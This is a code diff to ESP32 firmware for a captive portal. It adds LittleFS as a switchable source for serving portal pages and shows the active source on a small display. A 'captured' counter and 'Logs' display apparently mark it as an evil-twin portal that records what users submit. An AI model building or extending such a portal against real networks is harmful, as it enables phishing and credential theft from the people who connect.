@@ -6,6 +6,7 @@
 #include <SD.h>
 #include <SPI.h>
 #include <FS.h>
+#include <LittleFS.h>
 
 //  Captive Portal
 //    - Android : http://connectivitycheck.../generate_204
@@ -37,6 +38,30 @@ static DNSServer dnsServer;
 static WebServer webServer(80);
 static bool captiveRunning = false;
 static int  capturedCount  = 0;
+
+// De donde sale el html/css del portal. AUTO = lo de siempre (SD si el
+// archivo esta ahi, si no el embebido). Configurable con "portalsrc"
+// desde la terminal de Ajustes, para no depender de si el archivo
+// existe o no -- por ejemplo para forzar el embebido aunque haya algo
+// viejo en la SD, o para probar el portal guardado en LittleFS.
+static CaptivePortalSource portalSource = PORTAL_SRC_AUTO;
+
+void captiveSetPortalSource(CaptivePortalSource src) {
+  portalSource = src;
+}
+
+CaptivePortalSource captiveGetPortalSource() {
+  return portalSource;
+}
+
+const char* captivePortalSourceName() {
+  switch (portalSource) {
+    case PORTAL_SRC_EMBEDDED: return "embebido";
+    case PORTAL_SRC_SD:       return "SD";
+    case PORTAL_SRC_FS:       return "FS interno";
+    default:                  return "auto";
+  }
+}
 
 
 static bool sdReady() {
@@ -107,6 +132,49 @@ static bool serveFromSD(const char* path, const char* contentType) {
   return true;
 }
 
+// LittleFS: filesystem propio del ESP32, en la misma flash del chip.
+// No necesita SD -- sirve para llevar un portal personalizado sin
+// depender de que la tarjeta este puesta. begin(true) formatea solo
+// si hace falta (primera vez / particion corrupta).
+static bool fsReady() {
+  static bool mounted = false;
+  static bool tried = false;
+  if (!tried) {
+    tried = true;
+    mounted = LittleFS.begin(true);
+    if (!mounted) Serial.println(F("LittleFS: no se pudo montar"));
+  }
+  return mounted;
+}
+
+static bool serveFromFS(const char* path, const char* contentType) {
+  if (!fsReady() || !LittleFS.exists(path)) return false;
+
+  File f = LittleFS.open(path, "r");
+  if (!f) return false;
+
+  webServer.streamFile(f, contentType);
+  f.close();
+  return true;
+}
+
+// Punto unico de decision: segun portalSource, intenta la fuente
+// puntual que se eligio desde la terminal de Ajustes; con AUTO se
+// mantiene el comportamiento de siempre (SD si esta, si no nada aca
+// y el que llama cae al html embebido).
+static bool servePortalFile(const char* path, const char* contentType) {
+  switch (portalSource) {
+    case PORTAL_SRC_EMBEDDED:
+      return false;   // fuerza el embebido: ni mira SD ni FS
+    case PORTAL_SRC_SD:
+      return serveFromSD(path, contentType);
+    case PORTAL_SRC_FS:
+      return serveFromFS(path, contentType);
+    default:   // AUTO
+      return serveFromSD(path, contentType) || serveFromFS(path, contentType);
+  }
+}
+
 //  Paginas embebidas (tiene backup si la SD no tiene el portal html)
 
 static const char PAGE_PORTAL[] PROGMEM = R"HTML(<!DOCTYPE html>
@@ -174,19 +242,19 @@ p{color:#666;margin:0;font-size:14px}
 // ============================================================
 
 static void handleRoot() {
-  if (!serveFromSD(PORTAL_INDEX, "text/html")) {
+  if (!servePortalFile(PORTAL_INDEX, "text/html")) {
     webServer.send_P(200, "text/html", PAGE_PORTAL);
   }
 }
 
 static void handleStyle() {
-  if (!serveFromSD(PORTAL_CSS, "text/css")) {
+  if (!servePortalFile(PORTAL_CSS, "text/css")) {
     webServer.send(404, "text/plain", "");
   }
 }
 
 static void handleSuccess() {
-  if (!serveFromSD(PORTAL_OK, "text/html")) {
+  if (!servePortalFile(PORTAL_OK, "text/html")) {
     webServer.send_P(200, "text/html", PAGE_SUCCESS);
   }
 }
@@ -217,7 +285,7 @@ static void handleCaptive() {
                  uri.endsWith(".png")  || uri.endsWith(".jpg") ||
                  uri.endsWith(".jpeg") || uri.endsWith(".ico");
 
-  if (esAsset && serveFromSD(uri.c_str(), contentTypeFor(uri))) {
+  if (esAsset && servePortalFile(uri.c_str(), contentTypeFor(uri))) {
     return;
   }
 
@@ -353,8 +421,17 @@ void screenCaptiveLoop() {
     u8g2.drawStr(10, 36, "SSID:");
     u8g2.drawStr(40, 36, AP_SSID);
 
-    bool hasPortal = sdReady() && SD.exists(PORTAL_INDEX);
-    u8g2.drawStr(10, 48, hasPortal ? "Portal: SD" : "Portal: interno");
+    // En AUTO se muestra de donde sale de VERDAD el index.html (igual
+    // que resuelve servePortalFile); en modo forzado se muestra ese modo.
+    char portalLbl[24];
+    if (portalSource == PORTAL_SRC_AUTO) {
+      if (sdReady() && SD.exists(PORTAL_INDEX))            strcpy(portalLbl, "Portal: SD");
+      else if (fsReady() && LittleFS.exists(PORTAL_INDEX)) strcpy(portalLbl, "Portal: FS");
+      else                                                  strcpy(portalLbl, "Portal: interno");
+    } else {
+      snprintf(portalLbl, sizeof(portalLbl), "Portal: %s", captivePortalSourceName());
+    }
+    u8g2.drawStr(10, 48, portalLbl);
 
     char buffer[20];
     snprintf(buffer, sizeof(buffer), "Logs: %d", capturedCount);
